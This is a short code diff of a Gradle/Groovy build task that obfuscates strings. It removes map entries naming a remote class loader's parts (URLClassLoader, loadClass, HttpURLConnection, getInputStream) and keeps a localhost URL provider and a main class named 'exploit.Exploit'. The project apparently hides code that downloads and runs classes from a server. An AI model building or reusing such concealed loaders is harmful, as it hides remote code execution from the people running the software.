@@ -31,18 +31,7 @@ abstract class AsmObfuscateStringsTask extends DefaultTask {
 
     private static final Map<String, String> OBFUSCATION_MAP = [
             "::S_URL_PROVIDER::"           : "http://localhost:3000",
-            "::S_JAVA_NET_URL::"           : "java.net.URL",
-            "::S_JAVA_NET_URL_CLASS_LOADER::": "java.net.URLClassLoader",
-            "::S_JAVA_LANG_CLASS_LOADER::" : "java.lang.ClassLoader",
             "::S_MAIN_CLASS::"             : "com.tmquan2508.exploit.Exploit",
-            "::S_LOAD_CLASS_METHOD::"      : "loadClass",
-            "::S_HTTP_CONN_CLASS::"        : "java.net.HttpURLConnection",
-            "::S_URL_CONN_CLASS::"         : "java.net.URLConnection",
-            "::S_OPEN_CONN_METHOD::"       : "openConnection",
-            "::S_SET_REQ_METHOD::"         : "setRequestMethod",
-            "::S_HTTP_GET_METHOD::"        : "GET",
-            "::S_GET_INPUT_STREAM_METHOD::": "getInputStream",
-            "::S_DISCONNECT_METHOD::"      : "disconnect"
     ]
 
     @TaskAction
